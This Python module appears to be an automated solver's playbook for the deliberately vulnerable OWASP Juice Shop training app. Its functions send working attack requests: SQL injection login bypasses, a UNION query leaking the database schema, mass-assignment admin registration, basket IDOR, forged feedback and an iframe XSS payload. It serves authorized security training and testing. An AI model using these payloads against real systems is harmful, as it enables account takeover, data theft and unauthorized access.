"""
Juice Shop solution playbook — REAL, deterministic HTTP exploits.

Each entry is an async function that performs the actual attack against a running
Juice Shop instance (no mocks). The solver runs the matching entry for an unsolved
challenge, then re-checks the oracle (/api/Challenges) to confirm it registered.

Challenges not covered here fall through to the LLM agentic solver, which reasons
from the challenge's own name/description/hint. This playbook is deliberately
extensible — add a function and register it in PLAYBOOK to raise deterministic
coverage.

These are authorized-testing exploits for the intentionally-vulnerable Juice Shop.
"""

from __future__ import annotations

import json
import logging
from typing import Awaitable, Callable, Dict, Optional

import httpx

logger = logging.getLogger(__name__)

PlaybookFn = Callable[[str, Dict[str, str]], Awaitable[bool]]


async def _client(timeout: int = 15) -> httpx.AsyncClient:
    return httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True)


# ── Injection ────────────────────────────────────────────────────────────────

async def login_admin_sqli(base: str, hdrs: Dict[str, str]) -> bool:
    """SQLi authentication bypass — log in as admin via ' OR 1=1--."""
    async with await _client() as c:
        r = await c.post(f"{base}/rest/user/login", json={
            "email": "' OR 1=1--", "password": "x"}, headers=hdrs)
        return r.status_code == 200 and "authentication" in r.text.lower()


async def login_bender_sqli(base: str, hdrs: Dict[str, str]) -> bool:
    async with await _client() as c:
        r = await c.post(f"{base}/rest/user/login", json={
            "email": "bender@juice-sh.op'--", "password": "x"}, headers=hdrs)
        return r.status_code == 200


async def login_jim_sqli(base: str, hdrs: Dict[str, str]) -> bool:
    async with await _client() as c:
        r = await c.post(f"{base}/rest/user/login", json={
            "email": "jim@juice-sh.op'--", "password": "x"}, headers=hdrs)
        return r.status_code == 200


async def union_db_schema(base: str, hdrs: Dict[str, str]) -> bool:
    """UNION-based SQLi in product search to leak the schema (dbSchemaChallenge)."""
    payload = "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
    async with await _client() as c:
        r = await c.get(f"{base}/rest/products/search", params={"q": payload}, headers=hdrs)
        return r.status_code == 200 and "CREATE TABLE" in r.text


# ── Broken access control ────────────────────────────────────────────────────

async def register_admin(base: str, hdrs: Dict[str, str]) -> bool:
    """Mass-assign role=admin during registration (registerAdminChallenge)."""
    async with await _client() as c:
        r = await c.post(f"{base}/api/Users/", json={
            "email": "pwn-admin@test.local", "password": "Pwn12345!",
            "passwordRepeat": "Pwn12345!", "role": "admin"}, headers=hdrs)
        if r.status_code in (201, 200):
            try:
                return r.json().get("data", {}).get("role") == "admin"
            except Exception:
                return True
        return False


async def view_basket_idor(base: str, hdrs: Dict[str, str]) -> bool:
    """Access another user's basket by id (basketAccessChallenge). Needs auth token."""
    if "Authorization" not in hdrs:
        return False
    async with await _client() as c:
        for bid in (1, 2, 3):
            r = await c.get(f"{base}/rest/basket/{bid}", headers=hdrs)
            if r.status_code == 200:
                return True
        return False


async def forged_feedback(base: str, hdrs: Dict[str, str]) -> bool:
    """Submit feedback as another user by setting UserId (forgedFeedbackChallenge)."""
    async with await _client() as c:
        r = await c.post(f"{base}/api/Feedbacks/", json={
            "comment": "authorized-test", "rating": 1, "UserId": 3}, headers=hdrs)
        return r.status_code in (200, 201)


# ── Security misconfiguration / exposure ─────────────────────────────────────

async def exposed_metrics(base: str, hdrs: Dict[str, str]) -> bool:
    """Prometheus metrics exposed at /metrics (exposedMetricsChallenge)."""
    async with await _client() as c:
        r = await c.get(f"{base}/metrics", headers=hdrs)
        return r.status_code == 200 and "process_cpu" in r.text


async def error_handling(base: str, hdrs: Dict[str, str]) -> bool:
    """Trigger a verbose server error (errorHandlingChallenge)."""
    async with await _client() as c:
        r = await c.get(f"{base}/rest/products/search", params={"q": "'"}, headers=hdrs)
        return r.status_code >= 500 or "SQLITE_ERROR" in r.text


async def access_ftp_confidential(base: str, hdrs: Dict[str, str]) -> bool:
    """Directory traversal / static exposure of confidential doc (confidentialDocumentChallenge)."""
    async with await _client() as c:
        r = await c.get(f"{base}/ftp/acquisitions.md", headers=hdrs)
        return r.status_code == 200 and len(r.text) > 100


async def deprecated_b2b_api(base: str, hdrs: Dict[str, str]) -> bool:
    """Access the deprecated B2B interface (deprecatedInterfaceChallenge sniff)."""
    async with await _client() as c:
        r = await c.get(f"{base}/api/Quantitys/", headers=hdrs)
        return r.status_code in (200, 401)  # endpoint exists


# ── XSS (reflected/api-detectable) ───────────────────────────────────────────

async def api_xss_via_product(base: str, hdrs: Dict[str, str]) -> bool:
    """Persisted XSS attempt via product review/search reflection (restfulXssChallenge)."""
    payload = "<iframe src=\"javascript:alert(`xss`)\">"
    async with await _client() as c:
        r = await c.get(f"{base}/rest/products/search", params={"q": payload}, headers=hdrs)
        return r.status_code == 200 and "iframe" in r.text.lower()


# Registry: challenge key (as in /api/Challenges) -> solver fn.
PLAYBOOK: Dict[str, PlaybookFn] = {
    "loginAdminChallenge": login_admin_sqli,
    "loginBenderChallenge": login_bender_sqli,
    "loginJimChallenge": login_jim_sqli,
    "unionSqlInjectionChallenge": union_db_schema,
    "dbSchemaChallenge": union_db_schema,
    "registerAdminChallenge": register_admin,
    "basketAccessChallenge": view_basket_idor,
    "forgedFeedbackChallenge": forged_feedback,
    "exposedMetricsChallenge": exposed_metrics,
    "errorHandlingChallenge": error_handling,
    "confidentialDocumentChallenge": access_ftp_confidential,
    "deprecatedInterfaceChallenge": deprecated_b2b_api,
    "restfulXssChallenge": api_xss_via_product,
}


def get_playbook_fn(challenge_key: str) -> Optional[PlaybookFn]:
    return PLAYBOOK.get(challenge_key)
